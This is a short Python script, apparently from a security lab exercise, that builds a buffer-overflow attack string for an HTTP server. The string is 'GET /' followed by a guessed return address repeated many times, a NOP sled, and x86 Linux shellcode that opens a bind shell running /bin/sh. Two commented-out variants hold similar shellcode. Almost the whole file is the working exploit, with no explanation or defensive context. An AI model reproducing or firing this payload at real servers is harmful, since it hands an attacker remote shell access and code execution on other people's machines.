'''

'''


    
if __name__ == '__main__':
    
    #address from print statement: 3218678412
    
    nops = "GET /"
    addressGuess = "\xff\xfe\xff\xbf"
    for x in range(70):
        nops+=addressGuess
    for x in range(457):
        nops += "\x90"

    #shellcode 882
    shellcode= "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x14\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"


    #shellcode= "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80"

    #shellcode = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x22\xb8\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80"

#\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a
#\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68
#\x22\xb8\x6a\x10\x51\x50\xb0\x66\x89\xe1
#\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd
#\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f
#\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f
#\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80


    attackstring = nops + shellcode + " HTTP"
    
   
    print(attackstring)
    
    
    
